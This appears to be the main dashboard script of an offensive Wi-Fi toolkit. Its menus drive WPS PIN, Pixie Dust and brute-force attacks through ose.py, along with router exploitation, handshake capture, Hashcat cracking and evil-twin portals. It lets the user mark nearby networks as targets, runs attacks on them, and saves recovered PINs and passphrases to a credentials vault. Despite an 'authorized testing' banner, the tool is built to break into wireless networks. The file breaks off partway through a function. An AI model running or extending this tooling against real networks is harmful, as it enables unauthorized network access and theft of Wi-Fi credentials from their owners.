#!/usr/bin/env python3
"""WPS Toolkit - Professional Dashboard"""

import sys
import os
import time
import shutil
import signal
from datetime import datetime
from pathlib import Path

# Auto-install deps
for mod, pkg in [("rich","rich"),("psutil","psutil")]:
    try:
        __import__(mod)
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pkg])

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.rule import Rule
from rich.text import Text
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
import psutil

# Ensure modules path
sys.path.insert(0, str(Path(__file__).parent))

from config import Config
from database import Database
from modules.scanner import scan_iw, get_interface_mode, get_interfaces
from modules.wps_pins import suggest_pins, is_vulnerable_model
from modules.attack import run_ose, analyze_target, run_smart_attack
from modules.monitor_mode import (
    get_mode, enable_monitor, disable_monitor,
    kill_processes, get_iw_dev, iface_up, iface_down
)
from modules.reports import generate_html, export_json
from modules.wpa_supplicant import WpaSupplicant
from modules.wpa_engine import WpsEngine
from modules.auto_wps import AutoWPS
from modules.router_exploit import RouterExploiter, get_router_ip
from modules.wordlist import WordlistGenerator
from modules.handshake import HandshakeCapture, HandshakeAnalyzer
from modules.hashcat_runner import HashcatRunner
from modules.recon import NetworkRecon
from modules.evil_twin import EvilTwin, cleanup_portal
from modules.wpa2_evil_twin import Wpa2EvilTwin

THEME = {
    "ok": "bold green", "err": "bold red", "warn": "bold yellow",
    "inf": "cyan", "dim": "dim white", "hdr": "bold cyan",
    "mn": "bold green", "wps_on": "bold green",
    "wps_off": "bold red", "wps_unk": "yellow",
}
from rich.theme import Theme
con = Console(theme=Theme(THEME))


def banner():
    con.print("""
[hdr]╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ██╗    ██╗██████╗ ███████╗    ██╗  ██╗██╗████████╗     ║
║   ██║    ██║██╔══██╗██╔════╝    ██║ ██╔╝██║╚══██╔══╝     ║
║   ██║ █╗ ██║██████╔╝███████╗    █████╔╝ ██║   ██║        ║
║   ██║███╗██║██╔═══╝ ╚════██║    ██╔═██╗ ██║   ██║        ║
║   ╚███╔███╔╝██║     ███████║    ██║  ██╗██║   ██║        ║
║    ╚══╝╚══╝ ╚═╝     ╚══════╝    ╚═╝  ╚═╝╚═╝   ╚═╝        ║
║                                                           ║
║        Professional WPS Security Testing Suite             ║
║              For Authorized Testing Only                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝[/]""")


def status_bar(mon_start, db):
    uptime = int(time.time() - mon_start)
    ut = "{:02d}:{:02d}:{:02d}".format(uptime//3600, (uptime%3600)//60, uptime%60)
    cpu = psutil.cpu_percent(interval=0.1)
    mem = psutil.virtual_memory().percent
    st = db.get_stats()
    cc = "green" if cpu < 60 else ("yellow" if cpu < 85 else "red")
    mc = "green" if mem < 60 else ("yellow" if mem < 85 else "red")
    con.print(Panel(
        f"  {ut}  |  CPU:[{cc}]{cpu}%[/]  |  RAM:[{mc}]{mem}%[/]  |  "
        f"Nets:[inf]{st['total']}[/]  WPS:[ok]{st['wps']}[/]  "
        f"Tgts:[warn]{st['targets']}[/]  Creds:[ok]{st['compromised']}[/]",
        style="dim", height=3))


def _get_field(obj, key, default="?"):
    """Get field from dict or sqlite3.Row safely"""
    try:
        val = obj[key]
        return val if val is not None else default
    except (KeyError, IndexError):
        return default

def net_table(nets, title="Networks"):
    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
              border_style="cyan", title="[hdr]" + title + "[/]", padding=(0,1))
    t.add_column("#", style="dim", width=3, justify="center")
    t.add_column("ESSID", min_width=16)
    t.add_column("BSSID", style="cyan", min_width=17)
    t.add_column("CH", width=4, justify="center")
    t.add_column("RSSI", width=6, justify="center")
    t.add_column("WPS", justify="center")
    t.add_column("Lock", justify="center")
    t.add_column("Enc")
    t.add_column("Model", min_width=12)

    for i, n in enumerate(nets, 1):
        essid = str(_get_field(n, "essid", "Hidden"))
        if not essid or essid == "None":
            essid = "Hidden"
        bssid = str(_get_field(n, "bssid"))
        ch = str(_get_field(n, "channel", "?"))
        rssi = str(_get_field(n, "rssi", "?"))
        has_wps = int(_get_field(n, "has_wps", 0))
        lock = str(_get_field(n, "wps_locked", "Unknown"))
        enc = str(_get_field(n, "encryption", ""))
        model = str(_get_field(n, "wps_model", ""))

        wps_d = "[wps_on]Yes[/]" if has_wps else "[dim]-[/]"
        lock_d = "[wps_on]Open[/]" if lock == "No" else (
            "[wps_off]Locked[/]" if lock == "Yes" else "[wps_unk]?[/]")
        try:
            rv = int(rssi)
            rc = "green" if rv > -50 else ("yellow" if rv > -70 else "red")
        except (ValueError, TypeError):
            rc = "white"

        t.add_row(str(i), essid, bssid, ch, f"[{rc}]{rssi}[/]",
                  wps_d, lock_d, enc, model[:20] if model else "")
    con.print(t)


class App:
    def __init__(self):
        self.cfg = Config()
        self.db = Database()
        self.start_time = time.time()
        self.running = True

    def run(self):
        self._init()
        while self.running:
            try:
                con.clear()
                banner()
                status_bar(self.start_time, self.db)

                menu = Table(show_header=False, box=box.SIMPLE, padding=(0,2))
                menu.add_column("#", style="mn", width=4, justify="center")
                menu.add_column("Option", style="white", min_width=30)
                items = [
                    ("1","Network Scanner"), ("2","Target Management"),
                    ("3","Monitor Mode Manager"), ("4","Attack Center"),
                    ("5","wpa_supplicant Manager"), ("6","Auto-WPS"),
                    ("7","Router Exploiter"), ("8","Wordlist Generator"),
                    ("9","Handshake Capture"), ("10","Hashcat Cracker"),
                    ("11","Network Recon"), ("12","Evil Twin"),
                    ("13","WPA2 Evil Twin"), ("14","Live Monitor"),
                    ("15","Credentials Vault"), ("16","Reports"),
                    ("17","Device Info"), ("A","Settings"),
                    ("0","Exit"),
                ]
                for n, m in items:
                    menu.add_row(n, m)
                con.print(Panel(menu, border_style="cyan", padding=(1,2)))

                ch = Prompt.ask("[hdr]Select[/]",
                               choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","a","A"],
                               default="1")
                actions = {
                    "1": self.view_scanner, "2": self.view_targets,
                    "3": self.view_monitor, "4": self.view_attack,
                    "5": self.view_wpa, "6": self.view_auto_wps,
                    "7": self.view_router_exploit, "8": self.view_wordlist,
                    "9": self.view_handshake, "10": self.view_hashcat,
                    "11": self.view_recon, "12": self.view_evil_twin,
                    "13": self.view_wpa2_evil_twin, "14": self.view_live,
                    "15": self.view_creds, "16": self.view_reports,
                    "17": self.view_device,
                    "a": self.view_settings, "A": self.view_settings,
                }
                if ch == "0":
                    self._exit()
                elif ch in actions:
                    actions[ch]()
            except KeyboardInterrupt:
                self._exit()
                break
            except Exception as e:
                con.print(f"[err]Error: {e}[/]")
                import traceback
                traceback.print_exc()
                Prompt.ask("[dim]Enter[/]")

    def _init(self):
        con.clear()
        banner()
        if os.getuid() != 0:
            con.print("[warn]Not root! Some features may not work.[/]")
            time.sleep(2)

        ose = self.cfg.get("ose_path")
        if not os.path.isfile(ose):
            con.print(f"[warn]ose.py not found at: {ose}[/]")
            new_path = Prompt.ask("Enter ose.py path", default="")
            if new_path:
                self.cfg.set("ose_path", new_path)
        else:
            con.print(f"[ok]ose.py found: {ose}[/]")

        self.db.log("startup", "system", "WPS Toolkit started")
        time.sleep(1)

    def _exit(self):
        con.print("\n[hdr]Shutting down...[/]")
        if self.cfg.get("auto_backup"):
            try:
                p = self.db.backup()
                con.print(f"[dim]Backup: {p}[/]")
            except Exception:
                pass
        self.db.log("shutdown", "system", "WPS Toolkit shutdown")
        self.db.close()
        con.print("[ok]Goodbye![/]\n")
        self.running = False

    # ═══════════════════════════════════════
    # VIEW: SCANNER
    # ═══════════════════════════════════════
    def view_scanner(self):
        con.clear()
        con.print(Rule("[hdr]Network Scanner[/]", style="cyan"))
        iface = self.cfg.get("interface", "wlan0")
        mode = get_interface_mode(iface)
        con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{'ok' if mode=='monitor' else 'warn'}]{mode}[/]")

        con.print("\n  [mn]1[/] - Scan (iw dev scan)")
        con.print("  [mn]2[/] - Change Interface")
        con.print("  [mn]0[/] - Back\n")

        ch = Prompt.ask("Select", default="1")
        if ch == "0":
            return
        if ch == "2":
            ifaces = get_interfaces()
            if ifaces:
                for i, f in enumerate(ifaces, 1):
                    con.print(f"  [{i}] {f} ({get_interface_mode(f)})")
            iface = Prompt.ask("Interface", default=iface)
            self.cfg.set("interface", iface)
            con.print("[ok]Done[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        timeout = self.cfg.get("scan_timeout", 20)
        con.print(f"\n[inf]Scanning {iface} ({timeout}s)...[/]\n")

        try:
            with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                         BarColumn(bar_width=30), console=con) as prog:
                task = prog.add_task("Scanning WPS networks...", total=None)
                networks = scan_iw(iface, timeout)
                prog.update(task, completed=1, total=1)
        except Exception:
            networks = scan_iw(iface, timeout)

        nc = 0
        for n in networks:
            if not self.db.get_network(_get_field(n, "bssid")):
                nc += 1
            self.db.add_network(n)

        if networks:
            net_table(networks, f"Scan Results ({len(networks)} WPS networks)")

            con.print(f"\n  [inf]Found: {len(networks)} | New: {nc}[/]\n")

            for n in networks[:5]:
                pins = suggest_pins(_get_field(n, "bssid"))[:5]
                is_vuln, match = is_vulnerable_model(n.get("wps_model",""), n.get("wps_device",""))
                vuln_tag = f" [ok](VULN: {match})[/]" if is_vuln else ""
                lock_tag = f" [wps_off]LOCKED[/]" if _get_field(n, "wps_locked") == "Yes" else (
                    " [wps_on]OPEN[/]" if _get_field(n, "wps_locked") == "No" else "")
                con.print(f"  [inf]{n['essid']}[/] ({n['bssid']}){vuln_tag}{lock_tag}")
                if pins:
                    con.print(f"    PINs: {', '.join(p['pin'] + '(' + p['method'] + ')' for p in pins[:4])}")

            if Confirm.ask("\n  Select targets?", default=False):
                for n in networks:
                    con.print(f"  [inf]{n['essid']}[/] ({n['bssid']})")
                    if Confirm.ask("    Target?", default=False):
                        nid = self.db.add_network(n)
                        self.db.set_target(nid, True)
                        con.print("    [ok]Added[/]")
        else:
            con.print("[warn]No WPS networks found.[/]")
            con.print("[dim]Tips: Make sure interface is in managed mode for iw scan[/]")

        self.db.add_scan_record(iface, "iw", timeout, len(networks), nc)
        self.db.log("scan", "scanner", f"Found {len(networks)} WPS networks ({nc} new)")
        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: TARGETS
    # ═══════════════════════════════════════
    def view_targets(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Target Management[/]", style="cyan"))
            st = self.db.get_stats()
            con.print(f"\n  [inf]Nets: {st['total']} | WPS: {st['wps']} | Targets: {st['targets']}[/]")
            con.print("\n  [mn]1[/] All  [mn]2[/] Targets  [mn]3[/] Search")
            con.print("  [mn]4[/] Add BSSID  [mn]5[/] Remove  [mn]6[/] Mark All WPS")
            con.print("  [mn]7[/] Notes  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                nets = self.db.get_all_networks()
                if nets:
                    net_table(nets, f"All Networks ({len(nets)})")
                else:
                    con.print("[warn]No networks. Run scan first.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                tgts = self.db.get_targets()
                if tgts:
                    net_table(tgts, f"Targets ({len(tgts)})")
                else:
                    con.print("[warn]No targets.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                q = Prompt.ask("Search")
                res = self.db.search_networks(q)
                if res:
                    net_table(res, f"'{q}' ({len(res)})")
                else:
                    con.print("[warn]No results.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                b = Prompt.ask("BSSID").strip().upper()
                n = self.db.get_network(b)
                if n:
                    self.db.set_target(_get_field(n, "id"), True)
                    con.print(f"[ok]{n['essid']} added as target[/]")
                else:
                    con.print("[warn]Not in database. Run scan first.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                tgts = self.db.get_targets()
                if tgts:
                    net_table(tgts, "Targets")
                    b = Prompt.ask("BSSID to remove (or 'all')").strip()
                    if b.lower() == "all":
                        self.db.execute("UPDATE networks SET is_target=0")
                        con.print("[ok]All targets cleared[/]")
                    else:
                        n = self.db.get_network(b.upper())
                        if n:
                            self.db.set_target(_get_field(n, "id"), False)
                            con.print("[ok]Removed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                self.db.execute("UPDATE networks SET is_target=1 WHERE has_wps=1")
                c = self.db.fetch_one("SELECT COUNT(*) c FROM networks WHERE is_target=1 AND has_wps=1")["c"]
                con.print(f"[ok]{c} WPS networks marked as targets[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "7":
                b = Prompt.ask("BSSID").strip().upper()
                n = self.db.get_network(b)
                if n:
                    con.print(f"  {n['essid']} ({b})")
                    notes = Prompt.ask("Notes", default=n["notes"] or "")
                    self.db.execute("UPDATE networks SET notes=? WHERE id=?", (notes, _get_field(n, "id")))
                    con.print("[ok]Updated[/]")
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: MONITOR MODE
    # ═══════════════════════════════════════
    def view_monitor(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Monitor Mode Manager[/]", style="cyan"))
            iface = self.cfg.get("interface", "wlan0")
            mode = get_mode(iface)
            con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{'ok' if mode=='monitor' else 'warn'}]{mode}[/]")
            con.print("\n  [mn]1[/] Enable Monitor  [mn]2[/] Disable Monitor")
            con.print("  [mn]3[/] Kill Processes  [mn]4[/] Interface Up")
            con.print("  [mn]5[/] Interface Down  [mn]6[/] iw dev  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                con.print("[warn]Will kill wpa_supplicant[/]")
                if Confirm.ask("Continue?", default=True):
                    with console_status("Enabling monitor..."):
                        mon = enable_monitor(iface)
                    if mon:
                        con.print(f"[ok]Monitor mode: {mon}[/]")
                        self.cfg.set("interface", mon)
                    else:
                        con.print("[err]Failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                disable_monitor(iface)
                con.print("[ok]Monitor disabled[/]")
                self.cfg.set("interface", "wlan0")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                out = kill_processes()
                con.print(f"[ok]Processes killed[/]")
                if out:
                    con.print(f"[dim]{out[:200]}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                iface_up(iface)
                con.print("[ok]Up[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                iface_down(iface)
                con.print("[ok]Down[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                con.print(Panel(get_iw_dev(), title="iw dev"))
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: ATTACK CENTER
    # ═══════════════════════════════════════
    def view_attack(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Attack Center[/]", style="cyan"))
            iface = self.cfg.get("interface", "wlan0")
            mode = get_mode(iface)
            tgts = self.db.get_targets()
            con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{'ok' if mode=='monitor' else 'warn'}]{mode}[/]")
            con.print(f"  Targets: [inf]{len(tgts)}[/]")

            con.print("  [mn]1[/] Smart Attack (auto PIN)")
            con.print("  [mn]2[/] Pixie Dust  [mn]3[/] Brute Force")
            con.print("  [mn]4[/] PIN Attack  [mn]5[/] Attack from Targets")
            con.print("  [mn]6[/] Interactive  [mn]7[/] History  [mn]8[/] OSE Sessions")
            con.print()
            con.print("  [hdr]WPS Engine (Direct):[/]")
            con.print("  [mn]9[/]  Direct WPS PIN (own wpa_supplicant)")
            con.print("  [mn]10[/] Direct Pixie Dust (collect + crack)")
            con.print("  [mn]11[/] Direct WPS PBC")
            con.print("  [mn]12[/] Direct Scan (wpa_engine)")
            con.print("  [mn]0[/] Back")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                self._smart_attack()
            elif ch == "7":
                self._show_history()
            elif ch == "8":
                self._show_ose_sessions()
            elif ch == "6":
                self._interactive_attack()
            elif ch == "9":
                self._direct_wps_pin()
            elif ch == "10":
                self._direct_pixie()
            elif ch == "11":
                self._direct_pbc()
            elif ch == "12":
                self._direct_scan()
            elif ch in ("2","3","4","5"):
                self._launch_attack(ch)

    def _smart_attack(self):
        """Smart Attack - automatically selects best PIN"""
        con.clear()
        con.print(Rule("[hdr]Smart Attack[/]", style="cyan"))

        # Show networks from database for selection
        nets = self.db.get_all_networks()
        if not nets:
            con.print("[warn]No networks in database. Run a scan first.[/]")
            con.print("  [mn]1[/] - Quick scan now")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "1":
                self.view_scanner()
            return

        # Show networks table
        net_table(nets, "Select Target")

        con.print()
        sel = Prompt.ask("Enter # from list or BSSID", default="1")

        # Try to parse as number first
        try:
            idx = int(sel)
            if 1 <= idx <= len(nets):
                n = nets[idx - 1]
                bssid = _get_field(n, "bssid")
                essid = str(_get_field(n, "essid", "Unknown"))
                wps_ver = str(_get_field(n, "wps_version", ""))
                wps_lock = str(_get_field(n, "wps_locked", "Unknown"))
                channel = int(_get_field(n, "channel", 0))
            else:
                con.print("[err]Invalid number[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
        except ValueError:
            # User entered BSSID directly
            bssid = sel.strip().upper()
            if not bssid:
                return
            n = self.db.get_network(bssid)
            if n:
                essid = str(_get_field(n, "essid", "Unknown"))
                wps_ver = str(_get_field(n, "wps_version", ""))
                wps_lock = str(_get_field(n, "wps_locked", "Unknown"))
                channel = int(_get_field(n, "channel", 0))
            else:
                essid = Prompt.ask("ESSID", default="Unknown")
                wps_ver = ""
                wps_lock = "Unknown"
                channel = 0

        # Analyze target
        analysis = analyze_target(bssid, wps_ver, wps_lock)

        con.print(f"\n  [hdr]Target Analysis[/]")
        con.print(f"  BSSID:      [inf]{bssid}[/]")
        con.print(f"  ESSID:      [inf]{essid}[/]")
        con.print(f"  Manufacturer:[warn]{analysis['manufacturer']}[/]")
        con.print(f"  Algorithm:  [cyan]{analysis['algorithm']}[/]")
        con.print(f"  Confidence: [{'ok' if analysis['confidence']>70 else 'warn'}]{analysis['confidence']}%[/]")
        con.print(f"  Best PIN:   [ok]{analysis['best_pin']}[/]")
        con.print(f"  WPS:        v{wps_ver}  Lock: {wps_lock}")

        if n:
            model = _get_field(n, "wps_model", "")
            device = _get_field(n, "wps_device", "")
            if model:
                con.print(f"  Model:      {str(model)}")
            if device:
                con.print(f"  Device:     {str(device)}")

        con.print(f"\n  [hdr]PIN Suggestions (top 8):[/]")
        for i, p in enumerate(analysis["pins"][:8], 1):
            conf = p.get("confidence", 0)
            cc = "ok" if conf > 70 else ("warn" if conf > 40 else "dim")
            con.print(f"    {i}. [{cc}]{p['pin']}[/] ({p['method']}) conf:{conf}%")

        con.print(f"\n  [mn]1[/] - Try best PIN first")
        con.print("  [mn]2[/] - Smart sequence (PIN → Pixie → BF)")
        con.print("  [mn]3[/] - Try specific PIN from list")
        con.print("  [mn]0[/] - Back\n")

        ch = Prompt.ask("Select", default="2")

        if ch == "0":
            return

        sid = self.db.create_session(bssid, essid, "Smart Attack")
        self.db.log("attack", "attack", f"Smart attack on {essid} ({bssid})", "warn")

        def output_cb(line):
            ll = line.lower()
            if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[-]" in line or "locked" in ll or "nack" in ll:
                con.print(f"[warn]{line}[/]")
            elif "[!]" in line or "error" in ll:
                con.print(f"[err]{line}[/]")
            elif "smart" in ll or "step" in ll or "analysis" in ll:
                con.print(f"[hdr]{line}[/]")
            elif "trying pin" in ll or "scanning" in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        ose_path = self.cfg.get("ose_path")
        iface = self.cfg.get("interface")

        if ch == "1":
            con.print(f"\n[hdr]Trying best PIN: {analysis['best_pin']}[/]\n")
            result = run_ose(ose_path, iface, "pin", bssid, analysis["best_pin"], output_cb)
        elif ch == "2":
            con.print("\n[hdr]Smart Attack Sequence[/]\n")
            result = run_smart_attack(ose_path, iface, bssid, wps_ver, wps_lock, output_cb)
        elif ch == "3":
            pin_idx = IntPrompt.ask("PIN # from list", default=1)
            if 1 <= pin_idx <= len(analysis["pins"]):
                selected_pin = analysis["pins"][pin_idx-1]["pin"]
                con.print(f"\n[hdr]Trying: {selected_pin}[/]\n")
                result = run_ose(ose_path, iface, "pin", bssid, selected_pin, output_cb)
            else:
                con.print("[err]Invalid selection[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
        else:
            result = run_ose(ose_path, iface, "pin", bssid, analysis["best_pin"], output_cb)

        # Save results
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.db.update_session(sid, status=result["status"],
                              end_time=end_time,
                              pin_found=result["pin"] or "",
                              psk_found=result["psk"] or "",
                              log_path=result["log_file"])

        if result["pin"]:
            con.print(f"\n[ok]PIN FOUND: {result['pin']}[/]")
        if result["psk"]:
            con.print(f"[ok]PSK FOUND: {result['psk']}[/]")

        if result["status"] == "success":
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.add_credential(bssid, essid, result["pin"], result["psk"], "Smart Attack")
            self.db.log("success", "attack",
                       f"Credentials: PIN={result['pin']} PSK={result['psk']}", "ok")
            con.print("[ok]CREDENTIALS SAVED![/]")
        elif result["pin"]:
            self.db.add_credential(bssid, essid, result["pin"], result["psk"] or "", "Smart Attack")

        Prompt.ask("\n[dim]Enter[/]")

    def _get_target(self, ch):
        if ch == "4":
            tgts = self.db.get_targets()
            if not tgts:
                con.print("[warn]No targets.[/]")
                return None, None, None
            net_table(tgts, "Select Target")
            idx = IntPrompt.ask("Target #", default=1)
            if 1 <= idx <= len(tgts):
                t = tgts[idx-1]
                return str(_get_field(t, "bssid")), str(_get_field(t, "essid", "Hidden")), int(_get_field(t, "channel", 0))
            return None, None, None
        else:
            bssid = Prompt.ask("Target BSSID").strip().upper()
            if not bssid:
                return None, None, None
            n = self.db.get_network(bssid)
            if n:
                return bssid, str(_get_field(n, "essid", "Hidden")), int(_get_field(n, "channel", 0))
            essid = Prompt.ask("ESSID", default="Unknown")
            channel = IntPrompt.ask("Channel", default=0)
            return bssid, essid, channel

    def _launch_attack(self, ch):
        con.clear()
        con.print(Rule("[hdr]Launch Attack[/]", style="cyan"))

        if ch == "5":
            # Attack from targets
            tgts = self.db.get_targets()
            if not tgts:
                con.print("[warn]No targets. Add targets first (menu 2).[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            net_table(tgts, "Select Target")
            sel = Prompt.ask("Enter # from list or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(tgts):
                    t = tgts[idx - 1]
                    bssid = t["bssid"]
                    essid = str(_get_field(t, "essid", "Unknown"))
                    channel = _get_field(t, "channel", 0)
                else:
                    con.print("[err]Invalid[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    return
            except ValueError:
                bssid = sel.strip().upper()
                n = self.db.get_network(bssid)
                if n:
                    essid = str(_get_field(n, "essid", "Unknown"))
                    channel = int(_get_field(n, "channel", 0))
                else:
                    essid = Prompt.ask("ESSID", default="Unknown")
                    channel = 0
        else:
            # Show all networks for selection
            nets = self.db.get_all_networks()
            if nets:
                net_table(nets, "Select Target")
                sel = Prompt.ask("Enter # from list or BSSID", default="1")
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        n = nets[idx - 1]
                        bssid = _get_field(n, "bssid")
                        essid = str(_get_field(n, "essid", "Unknown"))
                        channel = int(_get_field(n, "channel", 0))
                    else:
                        con.print("[err]Invalid[/]")
                        Prompt.ask("\n[dim]Enter[/]")
                        return
                except ValueError:
                    bssid = sel.strip().upper()
                    n = self.db.get_network(bssid)
                    if n:
                        essid = str(_get_field(n, "essid", "Unknown"))
                        channel = int(_get_field(n, "channel", 0))
                    else:
                        essid = Prompt.ask("ESSID", default="Unknown")
                        channel = 0
            else:
                bssid = Prompt.ask("BSSID").strip().upper()
                if not bssid:
                    return
                n = self.db.get_network(bssid)
                essid = str(_get_field(n, "essid", "Unknown")) if n else Prompt.ask("ESSID", default="Unknown")
                channel = int(_get_field(n, "channel", 0)) if n else 0
        if not bssid:
            Prompt.ask("\n[dim]Enter[/]")
            return

        # Show vulnerability analysis
        n = self.db.get_network(bssid)
        if n:
            pins = suggest_pins(bssid)[:8]
            is_vuln, match = is_vulnerable_model(
                n.get("wps_model",""), n.get("wps_device",""))

            con.print(f"\n  [hdr]Vulnerability Analysis[/]")
            con.print(f"  ESSID:  [inf]{essid}[/]")
            con.print(f"  BSSID:  [inf]{bssid}[/]")
            con.print(f"  Model:  {n.get('wps_model','') or 'Unknown'}")
            con.print(f"  Device: {n.get('wps_device','') or 'Unknown'}")
            con.print(f"  WPS:    v{n.get('wps_version','')}  Lock: {n.get('wps_locked','?')}")
            if is_vuln:
                con.print(f"  Status: [ok]Known Vulnerable: {match}[/]")
            if pins:
                con.print("  [ok]Suggested PINs:[/]")
                for i, p in enumerate(pins[:6], 1):
                    con.print(f"    {i}. [ok]{p['pin']}[/] ({p['method']})")
        else:
            pins = suggest_pins(bssid)[:5]

        # Attack type
        atype_map = {"2":"pixie","3":"bruteforce","4":"pin","5":"auto"}
        atype = atype_map.get(ch, "pixie")

        if ch == "4":
            con.print("\n  [mn]1[/] Pixie Dust  [mn]2[/] Brute Force  [mn]3[/] PIN")
            a = Prompt.ask("Attack type", default="1")
            atype = {"1":"pixie","2":"bruteforce","3":"pin"}.get(a, "pixie")

        pin = None
        if atype == "pin":
            default_pin = pins[0]["pin"] if pins else ""
            pin = Prompt.ask("PIN", default=default_pin)

        names = {"pixie":"Pixie Dust","bruteforce":"Brute Force",
                 "pin":f"PIN ({pin})","auto":"Auto"}
        aname = names.get(atype, "Unknown")

        con.print(f"\n[hdr]{aname} on {essid} ({bssid})[/]")
        con.print(f"  Method: [ok]ose.py[/]  Interface: [inf]{self.cfg.get('interface')}[/]")

        if not Confirm.ask("\n  Start attack?", default=True):
            return

        # Create session
        sid = self.db.create_session(bssid, essid, aname)
        self.db.log("attack", "attack", f"{aname} on {essid} ({bssid})", "warn")

        con.print(f"\n[warn]Attack running... (Ctrl+C to stop)[/]\n")

        def output_cb(line):
            ll = line.lower()
            if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[-]" in line or "locked" in ll or "nack" in ll:
                con.print(f"[warn]{line}[/]")
            elif "[!]" in line or "error" in ll:
                con.print(f"[err]{line}[/]")
            elif "trying pin" in ll or "scanning" in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        result = run_ose(
            self.cfg.get("ose_path"), self.cfg.get("interface"),
            atype, bssid, pin, output_cb
        )

        # Save results
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.db.update_session(sid, status=result["status"],
                              end_time=end_time,
                              pin_found=result["pin"] or "",
                              psk_found=result["psk"] or "",
                              log_path=result["log_file"])

        if result["pin"]:
            con.print(f"\n[ok]PIN FOUND: {result['pin']}[/]")
        if result["psk"]:
            con.print(f"[ok]PSK FOUND: {result['psk']}[/]")

        if result["status"] == "success":
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.add_credential(bssid, essid, result["pin"], result["psk"], aname)
            self.db.log("success", "attack",
                       f"Credentials found: PIN={result['pin']} PSK={result['psk']}", "ok")
            con.print("[ok]CREDENTIALS SAVED![/]")
        elif result["pin"]:
            self.db.add_credential(bssid, essid, result["pin"], result["psk"] or "", aname)
            con.print("[ok]PIN saved[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _interactive_attack(self):
        con.clear()
        con.print(Rule("[hdr]Interactive Mode[/]", style="cyan"))
        con.print("\n[yellow]ose.py will scan and let you select target[/]")
        con.print("[dim]Press Enter to refresh, number to select, Ctrl+C to return[/]\n")
        if not Confirm.ask("Start?", default=True):
            return
        import subprocess
        cmd = [sys.executable, self.cfg.get("ose_path"),
               "-i", self.cfg.get("interface"), "-D"]
        con.print(f"[dim]Running: {' '.join(cmd)}[/]\n")
        try:
            proc = subprocess.Popen(cmd)
            proc.wait()
        except KeyboardInterrupt:
            try:
                proc.terminate()
            except Exception:
                pass
        Prompt.ask("\n[dim]Enter[/]")

    def _show_history(self):
        con.clear()
        con.print(Rule("[hdr]Attack History[/]", style="cyan"))
        sessions = self.db.get_sessions(30)
        if not sessions:
            con.print("[warn]No history.[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
                  title="[hdr]History[/]")
        t.add_column("ID", width=4)
        t.add_column("ESSID")
        t.add_column("BSSID", min_width=17)
        t.add_column("Type")
        t.add_column("Status")
        t.add_column("PIN")
        t.add_column("PSK")
        for s in sessions:
            sc = "ok" if s["status"] in ("success","completed") else (
                "warn" if s["status"] == "running" else "dim")
            t.add_row(str(s["id"]), s["essid"] or "-", s["bssid"] or "-",
                      s["attack_type"] or "-", f"[{sc}]{s['status']}[/]",
                      s["pin_found"] or "-", s["psk_found"] or "-")
        con.print(t)
        Prompt.ask("\n[dim]Enter[/]")

    def _show_ose_sessions(self):
        con.clear()
        con.print(Rule("[hdr]OSE Session Files[/]", style="cyan"))
        from pathlib import Path
        home = Path.home()
        for name, path in [("Pixiewps", ".OneShot-Extended/pixiewps"),
